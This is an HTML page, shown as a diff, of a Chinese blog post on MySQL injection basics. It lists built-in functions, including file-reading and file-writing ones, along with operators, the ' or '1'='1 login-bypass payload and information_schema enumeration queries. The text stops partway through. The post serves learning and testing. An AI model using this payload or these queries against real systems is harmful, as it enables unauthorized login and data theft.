@@ -1,0 +1,1059 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.png?v=7.4.1">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.1" color="#222">
+  <link rel="alternate" href="/atom.xml" title="C0cho's blog" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.1">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.1',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="本文主要讲解Mysql基础语法Mysql内置函数https://dev.mysql.com/doc/refman/5.7/en/dynindex-function.htmlMysql常用函数12345678910111213141516171819202122232425262728293031system_user() #系统用户名user() #用户名current_user() #当前用户名">
+<meta name="keywords" content="mysql">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mysql注入基础">
+<meta property="og:url" content="https://choge.top/2020/01/16/Mysql注入基础/index.html">
+<meta property="og:site_name" content="C0cho&#39;s blog">
+<meta property="og:description" content="本文主要讲解Mysql基础语法Mysql内置函数https://dev.mysql.com/doc/refman/5.7/en/dynindex-function.htmlMysql常用函数12345678910111213141516171819202122232425262728293031system_user() #系统用户名user() #用户名current_user() #当前用户名">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-1.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-2.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-3.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-4.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-6.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-5.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-7.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-8.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-9.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-10.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-11.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-12.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-13.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-14.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-15.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-16.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-18.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-19.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-21.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-22.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-23.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-24.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-25.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-26.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-27.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-28.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-29.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-30.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-31.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-32.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-33.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-34.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-36.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-37.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-38.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-39.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-40.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-41.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-42.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-43.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-44.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-47.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-48.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-49.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-50.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-51.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-52.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-53.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-54.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-55.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-56.png">
+<meta property="og:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-57.png">
+<meta property="og:updated_time" content="2020-03-31T03:13:55.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Mysql注入基础">
+<meta name="twitter:description" content="本文主要讲解Mysql基础语法Mysql内置函数https://dev.mysql.com/doc/refman/5.7/en/dynindex-function.htmlMysql常用函数12345678910111213141516171819202122232425262728293031system_user() #系统用户名user() #用户名current_user() #当前用户名">
+<meta name="twitter:image" content="https://choge.top/2020/01/16/Mysql注入基础/mysql-1.png">
+  <link rel="canonical" href="https://choge.top/2020/01/16/Mysql注入基础/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>Mysql注入基础 | C0cho's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">C0cho's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">less is more</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+        
+        
+        <li class="menu-item menu-item-home">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-about">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+          
+        
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">44</span></a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+      
+      
+        
+      
+        
+          
+        
+      
+        
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">8</span></a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+      
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">76</span></a>
+
+  </li>
+      
+    
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger">
+          <i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://choge.top/2020/01/16/Mysql注入基础/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="C0cho">
+      <meta itemprop="description" content="记录生活的点点滴滴">
+      <meta itemprop="image" content="/images/author.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="C0cho's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            Mysql注入基础
+            
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2020-01-16 11:38:57" itemprop="dateCreated datePublished" datetime="2020-01-16T11:38:57+08:00">2020-01-16</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-03-31 11:13:55" itemprop="dateModified" datetime="2020-03-31T11:13:55+08:00">2020-03-31</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Sql-injection/" itemprop="url" rel="index">
+                    <span itemprop="name">Sql injection</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+          
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span>5.9k</span>
+            </span>
+          
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span>5 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>本文主要讲解Mysql基础语法</p><h2 id="Mysql内置函数"><a href="#Mysql内置函数" class="headerlink" title="Mysql内置函数"></a>Mysql内置函数</h2><p><a href="https://dev.mysql.com/doc/refman/5.7/en/dynindex-function.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/dynindex-function.html</a></p><h2 id="Mysql常用函数"><a href="#Mysql常用函数" class="headerlink" title="Mysql常用函数"></a>Mysql常用函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">system_user() #系统用户名</span><br><span class="line">user() #用户名</span><br><span class="line">current_user() #当前用户名</span><br><span class="line">session_user() #连接数据库的用户名</span><br><span class="line">database() #数据库名</span><br><span class="line">version() #数据库版本，也可以使用@@version</span><br><span class="line">@@datadir #数据库路径</span><br><span class="line">@@basedir #数据库安装路径</span><br><span class="line">@@version_compile_os #操作系统</span><br><span class="line">count() #返回执行结果数量 select count(*) from users;</span><br><span class="line">concat() #没有分隔符地连接字符串</span><br><span class="line">concat_ws() #含有分隔符地连接字符串</span><br><span class="line">group_concat() #连接和一个组的所有字符串，并以逗号分隔每一条数据</span><br><span class="line">load_file() #读取本地文件</span><br><span class="line">into outfile #写文件</span><br><span class="line">ascii() #字符串的ASCII代码值</span><br><span class="line">ord() #返回字符串第一个字符的ASCII值</span><br><span class="line">mid()  #返回一个字符串的一部分</span><br><span class="line">substr()  #返回一个字符串的一部分</span><br><span class="line">length() #返回字符串的长度</span><br><span class="line">left() #返回字符串的最左边几个字符</span><br><span class="line">floor()  #返回小于或等于x的最大整数</span><br><span class="line">rand()  #返回0和1之间的一个随机数</span><br><span class="line">extractvalue()  #第一个参数：XMl document是String格式，为XMl文档对象的名称，中文为Doc，第二个参数：XPath string （Xpath格子的字符串）。作用：从目标XML中返回包含所查询的字符串</span><br><span class="line">updatexml()  #第一个参数：XML document是String格式，为XMl文档对象的名称，中文为Doc，第二个参数：XPath string （Xpath格子的字符串），第三个参数new value，String格式，替换查找到的符合条件的数据。作用：改变文档中符合条件的节点的值</span><br><span class="line">sleep()  #让此语句运行N秒钟</span><br><span class="line">if()  # &gt; SELECT IF(1&gt;2,2,3); &gt; 3</span><br><span class="line">char()  #返回整数ASCII代码字符组成的字符串</span><br><span class="line">STRCMP()  #比较字符串内容</span><br><span class="line">IFNULL()  #假如参数1不为NUll，则返回值为参数1，否则其返回值为参数2</span><br><span class="line">exp()  #返回e的x次方</span><br></pre></td></tr></table></figure><a id="more"></a>
+
+
+
+<h3 id="部分函数测试"><a href="#部分函数测试" class="headerlink" title="部分函数测试"></a>部分函数测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat() #没有分隔符地连接字符串</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-1.png" alt="mysql-1"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat_ws() #含有分隔符地连接字符串</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-2.png" alt="mysql-2"></p>
+<p>可以使用16进制的形式来进行分隔</p>
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-3.png" alt="mysql-3"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat() #连接和一个组的所有字符串，并以逗号分隔每一条数据</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-4.png" alt="mysql-4"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load_file() #读取本地文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-6.png" alt="mysql-6"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">into outfile #写文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-5.png" alt="mysql-5"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii() #字符串的ASCII代码值</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-7.png" alt="mysql-7"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ord() #返回字符串第一个字符的ASCII值</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-8.png" alt="mysql-8"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mid()  #返回一个字符串的一部分</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-9.png" alt="mysql-9"></p>
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-10.png" alt="mysql-10"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left() #返回字符串的最左边几个字符</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-11.png" alt="mysql-11"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">floor()  #返回小于或等于x的最大整数</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-12.png" alt="mysql-12"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if()  # &gt; SELECT IF(1&gt;2,2,3); -&gt; 3</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-13.png" alt="mysql-13"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char()  #返回整数ASCII代码字符组成的字符串</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-14.png" alt="mysql-14"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">STRCMP()  #比较字符串内容</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-15.png" alt="mysql-15"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IFNULL()  #假如参数1不为NUll，则返回值为参数1，否则其返回值为参数2</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-16.png" alt="mysql-16"></p>
+<h2 id="Mysql运算符"><a href="#Mysql运算符" class="headerlink" title="Mysql运算符"></a>Mysql运算符</h2><h3 id="算术运算符："><a href="#算术运算符：" class="headerlink" title="算术运算符："></a>算术运算符：</h3><table>
+<thead>
+<tr>
+<th align="center">符号</th>
+<th align="center">作用</th>
+<th align="center">符号</th>
+<th align="center">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">+</td>
+<td align="center">加法运算</td>
+<td align="center">%</td>
+<td align="center">求余运算</td>
+</tr>
+<tr>
+<td align="center">-</td>
+<td align="center">减法运算</td>
+<td align="center">DIV</td>
+<td align="center">除法运算，同”/“</td>
+</tr>
+<tr>
+<td align="center">*</td>
+<td align="center">乘法运算</td>
+<td align="center">MOD</td>
+<td align="center">求余运算，同”%”</td>
+</tr>
+<tr>
+<td align="center">/</td>
+<td align="center">除法运算</td>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+</tbody></table>
+<h3 id="比较运算符："><a href="#比较运算符：" class="headerlink" title="比较运算符："></a>比较运算符：</h3><table>
+<thead>
+<tr>
+<th align="center">符号</th>
+<th align="center">作用</th>
+<th align="center">符号</th>
+<th align="center">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">&gt;</td>
+<td align="center">大于</td>
+<td align="center">IS NOT NULL</td>
+<td align="center">不为空</td>
+</tr>
+<tr>
+<td align="center">&lt;</td>
+<td align="center">小于</td>
+<td align="center">BETWEEN AND</td>
+<td align="center">在…之间</td>
+</tr>
+<tr>
+<td align="center">=</td>
+<td align="center">等于</td>
+<td align="center">IN</td>
+<td align="center">包含</td>
+</tr>
+<tr>
+<td align="center">&gt;=</td>
+<td align="center">大于等于</td>
+<td align="center">NOT IN</td>
+<td align="center">不包含</td>
+</tr>
+<tr>
+<td align="center">&lt;=</td>
+<td align="center">小于等于</td>
+<td align="center">LIKE</td>
+<td align="center">模式匹配</td>
+</tr>
+<tr>
+<td align="center">!=或&lt;&gt;</td>
+<td align="center">不等于</td>
+<td align="center">NOT LIKE</td>
+<td align="center">模式匹配</td>
+</tr>
+<tr>
+<td align="center">IS NULL</td>
+<td align="center">为空</td>
+<td align="center">REGEXP</td>
+<td align="center">正则表达式</td>
+</tr>
+</tbody></table>
+<h3 id="逻辑运算符："><a href="#逻辑运算符：" class="headerlink" title="逻辑运算符："></a>逻辑运算符：</h3><table>
+<thead>
+<tr>
+<th align="center">符号</th>
+<th align="center">作用</th>
+<th align="center">符号</th>
+<th align="center">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">&amp;&amp;或AND</td>
+<td align="center">与</td>
+<td align="center">!或NOT</td>
+<td align="center">非</td>
+</tr>
+<tr>
+<td align="center">||或OR</td>
+<td align="center">或</td>
+<td align="center">XOR</td>
+<td align="center">异或</td>
+</tr>
+</tbody></table>
+<h3 id="部分运算符测试"><a href="#部分运算符测试" class="headerlink" title="部分运算符测试"></a>部分运算符测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in #包含</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-18.png" alt="mysql-18"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">not in #不包含</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-19.png" alt="mysql-19"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">like #模式匹配</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-21.png" alt="mysql-21"></p>
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-22.png" alt="mysql-22"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regexp #正则表达式</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-23.png" alt="mysql-23"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and #与</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-24.png" alt="mysql-24"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or #或</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-25.png" alt="mysql-25"></p>
+<h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><p>登录框SQL语句：<code>select * from users where username=&#39;admin&#39; and pwd=&#39;pass&#39;;</code>使用万能密码<code>&#39; or &#39;1&#39;=&#39;1</code>同时输入用户名和密码处，和原SQL语句拼接形成的语句为<code>select * from users where username=&#39;&#39; or &#39;1&#39;=&#39;1&#39; and pwd=&#39;&#39; or &#39;1&#39;=&#39;1&#39;</code>，形成<code>username=&#39;&#39;</code>为假，拼接<code>or &#39;1&#39;=&#39;1&#39;</code>为真语句后``select * from users where username=’’ or ‘1’=’1’<code>为真，继续拼接</code>pwd=’’<code>为假语句后</code>select * from users where username=’’ or ‘1’=’1’ and pwd=’’<code>为假，最后拼接</code>or ‘1’=’1’<code>真语句后</code>select * from users where username=’’ or ‘1’=’1’ and pwd=’’ or ‘1’=’1’`恒为真，成功登录。</p>
+<h2 id="SQL注入流程"><a href="#SQL注入流程" class="headerlink" title="SQL注入流程"></a>SQL注入流程</h2><p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-26.png" alt="mysql-26"></p>
+<h3 id="MySQL内置库（-gt-5-7）"><a href="#MySQL内置库（-gt-5-7）" class="headerlink" title="MySQL内置库（&gt;=5.7）:"></a>MySQL内置库（&gt;=5.7）:</h3><p>mysql：保存有账户信息，权限信息，储存过程，event，时区等信息。</p>
+<p>sys：包含了一系列的存储过程、自定义函数以及视图来帮助我们快速的了解系统的元数据信息。（元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等）</p>
+<p>performance_schema：用于收集数据库服务器性能参数</p>
+<p>information_schema：它提供了访问数据库元数据的方式。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库表，表的数据类型和访问权限。</p>
+<h3 id="查询语句核心语法"><a href="#查询语句核心语法" class="headerlink" title="查询语句核心语法"></a>查询语句核心语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select schema_name from information_schema.schemata  #查库</span><br><span class="line">select table_name from information_schema.tables where table_schema=库名  #查表</span><br><span class="line">select column_name from information_schema.columns where table_name=表名  #查列</span><br><span class="line">select 列名 from 库名.表名  #查数据</span><br></pre></td></tr></table></figure>
+
+<h3 id="部分查询语句测试"><a href="#部分查询语句测试" class="headerlink" title="部分查询语句测试"></a>部分查询语句测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select schema_name from information_schema.schemata  #查库</span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/01/16/Mysql注入基础/mysql-27.png" alt="mysql-27"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables table_schema=&apos;security&apos;  #查表</span><br></pre></td></tr></table></figure>
+
